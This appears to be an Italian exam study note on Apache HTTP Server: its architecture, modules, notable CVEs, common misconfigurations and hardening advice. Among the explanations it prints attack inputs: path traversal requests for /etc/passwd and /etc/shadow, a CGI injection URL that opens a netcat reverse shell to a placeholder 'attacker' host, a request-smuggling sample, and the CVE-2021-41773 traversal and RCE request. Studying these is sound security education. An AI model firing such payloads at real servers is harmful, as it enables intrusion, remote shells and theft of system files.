## tags: [eth, web-server, unix-hacking, http, memory-corruption] capitolo: HE7 Ch.5 collegato: [[command_injection]], [[integer_overflow_attacks]], [[dangling_pointers]], [[openssl_security]]

# Apache HTTP Server — Architettura e Vulnerabilità

## Cos'è

**Apache HTTP Server** (spesso solo "Apache", o `httpd`) è il web server più diffuso storicamente sul mondo UNIX. Open-source, modulare, scritto in C, mantenuto dall'Apache Software Foundation.

**Disambiguation**: "Apache" come parola ambigua copre molti progetti diversi (Tomcat, Kafka, Spark, Log4j...). Qui parliamo **solo del web server HTTPD**.

Porta standard: **80/tcp** (HTTP), **443/tcp** (HTTPS via [[OpenSSL]] o mod_tls).

**Perché è target privilegiato:**

- Esposto su perimetro internet 24/7
- Spesso gira con privilegi bassi (`www-data`, `apache`) ma il **master process** è root (per bind su porte privilegiate)
- Modulare → ogni modulo aggiunge superficie d'attacco
- Spesso fronta applicazioni PHP/CGI/Python → backend bugs si ereditano

---

## Architettura

### Master + Worker model

```
master process (root)
  ├── bind() su porta 80/443
  ├── legge config (httpd.conf)
  ├── fork worker process come www-data
  └── gestisce signal e respawn worker

worker processes (www-data)
  ├── accept() connessioni
  ├── parsano HTTP request
  ├── eseguono i moduli
  └── rispondono al client
```

Il privilege drop è uguale al pattern visto per BIND ([[dns_attacks]]): root per bind alla porta, poi drop a utente non privilegiato.

### MPM (Multi-Processing Modules)

Tre modelli di concorrenza, configurabili a compile time:

|MPM|Modello|Uso tipico|
|---|---|---|
|**prefork**|Processi separati, no thread|Default storico, sicuro per moduli non thread-safe (es. mod_php)|
|**worker**|Thread dentro processi|Più efficiente, richiede moduli thread-safe|
|**event**|Worker + handling asincrono delle connessioni keep-alive|Più scalabile, default moderno|

### Moduli

Apache è una piccola core + tanti moduli caricabili:

|Modulo|Funzione|
|---|---|
|`mod_ssl`|TLS/SSL (linka [[openssl_security]])|
|`mod_rewrite`|URL rewriting via regex|
|`mod_proxy`|Reverse proxy|
|`mod_cgi`|Esecuzione script CGI|
|`mod_php`|Embed di PHP interpreter|
|`mod_userdir`|Mappa `/~user/` a `/home/user/public_html/`|
|`mod_status`|Pagina di status del server (`/server-status`)|
|`mod_info`|Info di configurazione (`/server-info`)|
|`mod_alias`|URL → filesystem aliases|
|`mod_auth_*`|Vari meccanismi di autenticazione|

Ogni modulo è codice C che gira nel worker → ogni modulo è una potenziale bug factory.

---

## Configurazione (file principali)

```
/etc/apache2/apache2.conf      # Debian/Ubuntu main config
/etc/httpd/httpd.conf          # RHEL/CentOS main config
/etc/apache2/sites-available/  # Virtual host definitions
/etc/apache2/mods-enabled/     # Moduli attivi
.htaccess                       # Config per-directory (se AllowOverride attivo)
```

### Direttive critiche per sicurezza

```apache
# Information disclosure
ServerTokens Prod              # Solo "Apache" (no versione)
ServerSignature Off            # No banner in error pages

# Directory listing
Options -Indexes               # Disabilita autoindex

# Symlink following
Options -FollowSymLinks        # Evita escape filesystem
Options +SymLinksIfOwnerMatch  # Compromesso

# .htaccess
AllowOverride None             # Disabilita override per directory

# User context
User www-data
Group www-data
```

---

## Attack Surface

### 1. Information Disclosure (ricognizione)

```bash
# Banner grab
curl -I http://target/
# Server: Apache/2.4.49 (Ubuntu)   ← versione esposta

# Pagine di status mal configurate
curl http://target/server-status     # mod_status, info su request live
curl http://target/server-info       # mod_info, intera config esposta
curl http://target/.htaccess         # se mal serviti
curl http://target/.git/             # repo committato per errore (frequentissimo)

# Backup files dimenticati
curl http://target/index.php.bak
curl http://target/config.old
curl http://target/wp-config.php.swp # vim swap files
```

Tool: `gobuster`, `dirb`, `feroxbuster`, `nikto` automatizzano la scoperta.

---

### 2. Directory Traversal

```
GET /../../../../etc/passwd HTTP/1.1
GET /cgi-bin/script?file=../../../etc/passwd
GET /static/../../../../etc/shadow
```

Apache di base normalizza i path (i `..` non scappano dalla DocumentRoot), ma:

- Moduli mal scritti possono passare path raw ai backend
- Configurazioni `Alias` o `mod_rewrite` sbagliate possono aprire varchi
- CGI script che leggono filename da query string sono vulnerabili (vedi CVE-2021-41773 sotto)

---

### 3. Command Injection via CGI

Pattern classico [[command_injection]]:

```
http://target/cgi-bin/script.cgi?param=foo;cat+/etc/passwd
http://target/cgi-bin/script.cgi?email=foo@bar.com|nc+attacker+4444+-e+/bin/sh
```

CGI eseguito con privilegi `www-data` → leakable file system + reverse shell back channel. Stesso pattern AWStats che hai studiato in [[command_injection]].

---

### 4. HTTP Request Smuggling

Quando frontend (reverse proxy / load balancer) e backend (Apache) interpretano i confini delle richieste HTTP in modo diverso, un attaccante può iniettare richieste "nascoste":

```
POST / HTTP/1.1
Host: target
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target
...
```

Il frontend vede una sola richiesta (usa Content-Length), il backend ne vede due (usa Transfer-Encoding). La seconda "request nascosta" bypassa controlli del frontend. Variante moderna nota: CL.TE, TE.CL, TE.TE desync.

---

### 5. HTTP/2 specifici

HTTP/2 ha attacchi suoi:

- **HTTP/2 Rapid Reset** (CVE-2023-44487): DDoS massiccio sfruttando RST_STREAM. Causò outage record da Google Cloud, AWS, Cloudflare nell'ottobre 2023.
- **HTTP/2 stream multiplexing abuse** → resource exhaustion

---

## CVE Iconici

### Slapper Worm (CVE-2002-0656) — 2002

Buffer overflow in `mod_ssl` (che usa [[OpenSSL]]). Worm self-propagating: scanning di server Apache, exploit di mod_ssl, payload che bootstrappa un peer-to-peer botnet UDP.

**Lezione**: una vulnerabilità in OpenSSL si trasforma in worm Apache. Le dipendenze contano.

---

### Apache Chunked Encoding (CVE-2002-0392) — 2002

Integer overflow nel parsing del Transfer-Encoding chunked. Classifica: [[Integer Overflow & Signedness Attacks|integer overflow attack]] (la dimensione del chunk wrappa, malloc troppo piccolo, heap overflow).

Worm associato: **Scalper** su FreeBSD/Apache.

---

### Apache Killer (CVE-2011-3192) — 2011

DoS via header HTTP `Range` malformato:

```
GET / HTTP/1.1
Host: target
Range: bytes=0-,5-1,5-2,5-3,5-4,5-5,5-6,...     ← centinaia di range
```

Apache cerca di servire tutti i range richiesti contemporaneamente → memoria esaurita → crash o thrashing. **Few requests, server down.**

Categoria: DoS asimmetrico (costo basso lato attaccante, alto lato server).

---

### Optionsbleed (CVE-2017-9798) — 2017

**Use-after-free** in Apache che leakava memoria del processo via header `Allow` in risposte al metodo `OPTIONS`. Heartbleed-style ma su Apache invece che OpenSSL.

```bash
# Più richieste OPTIONS rivelavano frammenti diversi di memoria del worker
for i in {1..100}; do
    curl -X OPTIONS http://target/ -i | grep Allow
done
```

Pattern: [[Dangling Pointers]] — accesso a memoria liberata → leak di dati di altre sessioni.

---

### CVE-2021-41773 / CVE-2021-42013 — Path Traversal + RCE

In Apache 2.4.49/2.4.50, il normalizzatore di path è stato modificato e introdotto un bug:

```
GET /icons/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1
                ↑
            ".." encoded twice
```

La doppia decodifica permetteva di scappare dalla DocumentRoot. **Worse**: se `mod_cgi` era abilitato, lo stesso path traversal portava a RCE:

```
POST /cgi-bin/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Content-Length: ...

echo Content-Type: text/plain; echo; id
```

Sfruttato in the wild entro 24 ore dal disclosure.

Mostra: una modifica al codice di normalizzazione path = catastrofe. Stesso tipo di bug che si è ripetuto in altri server.

---

### CVE-2019-0211 — Carpe Diem (privilege escalation)

In Apache 2.4.17-38 con MPM prefork: un worker process (www-data) poteva scrivere in una struttura condivisa con il master process (root). Tramite race condition, un worker poteva ottenere code execution come root al graceful restart.

Pattern: trust improprio tra processo privilegiato (master) e processo non privilegiato (worker). Variante della stessa classe di bug del privilege escalation locale tramite file system race.

---

### CVE-2017-15715 — .htaccess Newline Confusion

Apache permetteva `.htaccess` con bypass tramite newline injection nei nomi file. Permetteva di bypassare regole `<Files>` o `<FilesMatch>`. Categoria: parsing inconsistency.

---

## Filo Conduttore

|Pattern|CVE esempio|
|---|---|
|Buffer/integer overflow in C|Slapper, Chunked Encoding|
|Use-after-free / memory disclosure|Optionsbleed|
|Path normalization bug|CVE-2021-41773|
|Privilege boundary mal protetta|Carpe Diem|
|Parsing inconsistency tra componenti|HTTP smuggling, .htaccess newline|
|Resource exhaustion asimmetrico|Apache Killer, HTTP/2 Rapid Reset|

**Filo unificante**: Apache è scritto in C, parsa HTTP (protocollo testuale, fragile per definizione), gira moduli di terze parti, ha 25+ anni di codice legacy. Stesso archetipo di [[openssl_security]] e di rpc.statd ([[DNS]] attack) — codice complesso C + input untrusted + privilegi alti = bug factory perpetua.

---

## Misconfigurations Frequenti (più letali dei CVE)

|Errore|Impatto|
|---|---|
|`Options +Indexes`|Directory listing → leak struttura sito + file dimenticati|
|`mod_status` esposto pubblicamente|Vedi tutte le request live, IP, URI con query parameter|
|`mod_userdir` aperto|Enumerazione utenti via `/~root/`, `/~admin/`|
|`.git/` committato in DocumentRoot|Dump intero repo source code|
|File `.bak`, `.old`, `.swp` serviti|Codice sorgente leak|
|CGI scripts world-writable|Backdoor immediata|
|`AllowOverride All`|`.htaccess` può cambiare config = privilege escalation se filesystem compromesso|
|Default error pages con dettagli|Information disclosure|
|`Server: Apache/2.4.49` esposto|Ricognizione e CVE matching|
|Servire DocumentRoot di un'altra app per errore|Cross-application disclosure|

In pratica gli attacchi reali sui server Apache sono spesso questi, non i CVE memory corruption.

---

## Countermeasures

### Hardening di base

```apache
# Information disclosure
ServerTokens Prod
ServerSignature Off

# No directory listing
<Directory /var/www/>
    Options -Indexes -FollowSymLinks
    AllowOverride None
    Require all granted
</Directory>

# Limit metodi HTTP
<LimitExcept GET POST HEAD>
    Require all denied
</LimitExcept>

# Disabilita moduli non necessari
# Spesso default-on ma inutili: mod_status, mod_info, mod_userdir, mod_autoindex

# Limita header per protezione DoS
LimitRequestFields 100
LimitRequestFieldSize 8190
LimitRequestLine 8190
LimitRequestBody 10485760    # 10MB

# Timeout aggressivi
Timeout 30
KeepAliveTimeout 5
```

### Pratiche operazionali

|Pratica|Perché|
|---|---|
|**Update aggressivo**|Tutti i CVE sopra patchati in giorni dal disclosure|
|WAF (ModSecurity, Cloudflare)|Filtra attack pattern noti prima di Apache|
|`mod_security` con CRS|Defense in depth applicativo|
|Privilege separation (default)|Worker come www-data, non root|
|chroot / containerizzazione|Limita impatto post-exploit|
|Logging + alerting (access_log, error_log)|Detection di attacchi|
|Rimozione tool default (`/icons/`, `/manual/`)|Riduzione information disclosure|
|Audit `/server-status` access|Spesso lasciato aperto inconsapevolmente|
|HTTP/2 + HTTPS + HSTS|Standard moderno, riduce alcune classi di attacco|

---

## Alternative

|Server|Quota mercato 2024|Note|
|---|---|---|
|**nginx**|Dominante per nuovi deploy|Architettura event-driven, più semplice da hardenare, meno CVE memory corruption|
|**Apache HTTPD**|Ancora enorme legacy|Modularità superiore, supporto `.htaccess`, dominante in shared hosting|
|**Caddy**|Crescente|Default HTTPS automatico, scritto in Go (no memory corruption classica)|
|**lighttpd**|Niche|Embedded, lightweight|
|**IIS**|Windows enterprise|Microsoft, ecosistema separato|

nginx ha sorpassato Apache per traffic share su top website, ma Apache resta diffusissimo in legacy e shared hosting.

---

## TL;DR esame

1. Apache = web server modulare C, master root + worker www-data (privilege separation)
2. Moduli = superficie d'attacco moltiplicata (mod_ssl, mod_cgi, mod_php...)
3. Attacchi storici memory corruption: Slapper (mod_ssl 2002), Chunked Encoding (integer overflow 2002), Optionsbleed (UAF 2017)
4. Path traversal famoso: CVE-2021-41773 (doppia decodifica → /etc/passwd o RCE via CGI)
5. DoS asimmetrico: Apache Killer (Range header 2011), HTTP/2 Rapid Reset (2023)
6. Privilege escalation: Carpe Diem (CVE-2019-0211, worker→root via race)
7. Misconfigurations più letali dei CVE: directory listing, .git esposto, mod_status pubblico, ServerTokens completo
8. Pattern strutturale uguale a [[openssl_security]] e BIND: C + input HTTP + moduli legacy + privilegi alti = bug factory
9. Difese: update, WAF, hardening config, privilege separation, monitoraggio
10. Alternative moderne: nginx, Caddy — meno surface area, ma Apache rimane dominante in legacy